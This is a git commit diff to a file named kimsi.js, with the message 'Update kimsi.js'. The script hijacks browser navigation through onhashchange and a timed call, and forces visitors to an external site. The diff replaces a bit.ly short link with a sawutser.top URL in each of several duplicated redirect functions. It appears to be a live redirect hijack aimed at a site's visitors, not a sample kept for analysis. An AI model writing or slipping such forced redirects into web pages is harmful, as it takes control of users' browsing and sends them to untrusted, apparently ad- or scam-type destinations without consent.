3c6181ca600217506562f6dad227d3f34c8489f1
katemj25 <mbokofficial1@gmail.com>
2025-05-13 00:31:25 -0700

    Update kimsi.js

--- kimsi.js
+++ kimsi.js
@@ -4,14 +4,14 @@ window.onhashchange=function(){jp();};
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://bit.ly/3W6qUJU";
+        location.href="https://sawutser.top/4/9089389";
     }
     function goon(){
-        location.href="https://bit.ly/3W6qUJU";
+        location.href="https://sawutser.top/4/9089389";
     }
 function goon(){
-        location.href="https://bit.ly/3W6qUJU";
+        location.href="https://sawutser.top/4/9089389";
     }
 function goon(){
-        location.href="https://bit.ly/3W6qUJU";
+        location.href="https://sawutser.top/4/9089389";
     }
